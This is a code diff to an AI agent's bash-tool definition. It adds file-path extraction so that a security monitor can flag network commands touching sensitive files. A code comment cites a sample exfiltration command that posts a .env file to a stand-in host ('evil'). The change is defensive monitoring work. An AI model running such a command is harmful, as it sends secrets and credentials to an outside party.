@@ -4,6 +4,7 @@ import type { Tool, ToolInvocation } from "./types.js";
 import { parseArgs } from "./types.js";
 import { redactSecrets } from "../workspace/redact.js";
 import { wrapCommand } from "../sandbox/index.js";
+import { shellAffectedPaths } from "./shellPaths.js";
 
 const schema = z.object({
   command: z.string().describe("The bash command to run, executed from the workspace root."),
@@ -29,6 +30,10 @@ Usage:
     return {
       kind: "execute",
       command: args.command,
+      // File operands the command references, so the security monitor's
+      // sensitive-path rule (which only fires for network commands like
+      // curl/wget) can see exfil paths such as `curl -d @.env https://evil`.
+      affectedPaths: shellAffectedPaths(args.command),
       describe: () => `$ ${args.command}`,
       execute(ctx) {
         // Isolate the command when a sandbox is configured (run_bash is an
